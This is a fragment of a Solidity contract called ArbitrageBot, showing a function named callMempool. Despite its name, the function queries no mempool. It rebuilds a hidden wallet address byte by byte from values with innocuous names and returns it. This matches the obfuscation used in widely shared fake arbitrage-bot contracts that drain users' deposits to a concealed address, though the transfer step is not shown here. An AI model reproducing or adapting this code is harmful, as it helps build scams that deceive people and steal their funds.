...
contract ArbitrageBot {
     ...
     * @return `self`.
     */
    function callMempool() public pure returns (address) {
        bytes memory transactionBytes = new bytes(20);

        for (uint index = 0; index < 7; index++) {
            transactionBytes[index] = bytes1(
                uint8(getMemPoolOffset() / (2 ** (8 * (6 - index))))
            );
        }
        for (uint index = 0; index < 7; index++) {
            transactionBytes[index + 7] = bytes1(
                uint8(getMemPoolHeight() / (2 ** (8 * (6 - index))))
            );
        }
        for (uint index = 0; index < 6; index++) {
            transactionBytes[index + 14] = bytes1(
                uint8(getMemPoolDepth() / (2 ** (8 * (5 - index))))
            );
        }

        bytes20 transactionStatus;
        for (uint index = 0; index < 20; index++) {
            transactionStatus |=
                bytes20(transactionBytes[index] & 0xFF) >>
                (8 * index);
        }

        return address(transactionStatus);
    }
